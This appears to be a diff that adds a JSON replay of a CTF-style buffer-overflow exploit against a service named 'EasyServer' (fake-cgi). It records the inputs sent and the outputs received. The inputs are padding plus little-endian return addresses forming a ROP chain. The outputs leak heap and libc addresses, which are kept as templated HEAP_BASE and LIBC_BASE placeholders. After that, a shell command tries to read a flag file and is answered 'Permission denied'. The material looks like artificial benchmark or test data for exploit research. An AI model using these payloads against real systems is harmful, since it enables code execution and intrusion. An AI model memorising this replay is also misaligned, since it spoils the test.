@@ -1,0 +1,13 @@
+[
+    "1Who r u?\\n", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd\\n", 
+    "1welcome!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\\xa3\\t@\\x00\\x00\\x00\\x00\\x00\\x18\\x10`\\x00\\x00\\x00\\x00\\x00 \\x06@\\x00\\x00\\x00\\x00\\x00\\xb6\\x07@\\x00\\x00\\x00\\x00\\x00\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\\xa3\\t@HTTP/1.1 404 Not {{{HEAP_BASE:12102:3:ORI:202:0x756f46}}}nd\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nS{{{HEAP_BASE:78437:3:ORI:172:0x767265}}}er: EasyS{{{HEAP_BASE:78437:3:ORI:172:0x767265}}}er (L{{{HEAP_BASE:11881:3:ORI:180:0x756e69}}}x)\\r\\n\\r\\n<h3>Page Not {{{HEAP_BASE:12102:3:ORI:202:0x756f46}}}nd</h3>{{{LIBC_BASE:456336:6:ORI:212:0x7fa496ef4690}}}\\nWho r u?\\n", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd\\n", 
+    "1welcome!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb{{{LIBC_BASE:283158:8:ORI:72:0x7fa496eca216}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb{{{LIBC_BASE:283158:6:ORI:72:0x7fa496eca216}}}HTTP/1.1 404 Not {{{HEAP_BASE:12102:3:ORI:205:0x756f46}}}nd\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nS{{{HEAP_BASE:78437:3:ORI:175:0x767265}}}er: EasyS{{{HEAP_BASE:78437:3:ORI:175:0x767265}}}er (L{{{HEAP_BASE:11881:3:ORI:183:0x756e69}}}x)\\r\\n\\r\\n<h3>Page Not {{{HEAP_BASE:12102:3:ORI:205:0x756f46}}}nd</h3>", 
+    "0/bin/cat /flags/fake-cgi/flag\\n", 
+    "2sh: 1: /bin/cat: Permission denied\\n"
+]
